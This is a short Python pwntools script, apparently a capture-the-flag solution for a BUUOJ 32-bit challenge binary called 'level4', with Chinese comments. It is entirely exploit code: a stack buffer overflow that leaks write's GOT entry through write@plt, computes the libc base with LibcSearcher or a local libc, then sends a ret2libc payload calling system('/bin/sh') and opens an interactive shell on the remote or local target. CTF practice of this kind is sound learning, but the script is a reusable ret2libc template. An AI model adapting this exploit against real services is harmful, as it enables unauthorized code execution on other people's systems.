from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)


context(os='linux', arch='i386', log_level='debug')
binary = './level4'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',29599) if argv[1]=='r' else process(binary)


search_fun = 'write' #被泄露地址的函数
main_addr = 0x804844B
print_fun = 'write' #打印被泄露地址的函数

print_fun_plt = elf.plt[print_fun]
search_fun_got = elf.got[search_fun]

payload = b'a'* (0x88+4) + p32(print_fun_plt) + p32(main_addr) + p32(1) + p32(search_fun_got) + p32(4) #根据选择的print_fun改变参数

# io.recvuntil(b"Input:\n")
io.sendline(payload)
search_addr = u32(io.recv(4))
print("search_addr = ",hex(search_addr))
system_addr,binsh_addr = ret2libc(search_addr,search_fun)


payload1 = b'a' * (0x88+4) + p32(system_addr) + p32(1234) + p32(binsh_addr)
# io.recvuntil(b"Input:\n")
io.sendline(payload1)
io.interactive()


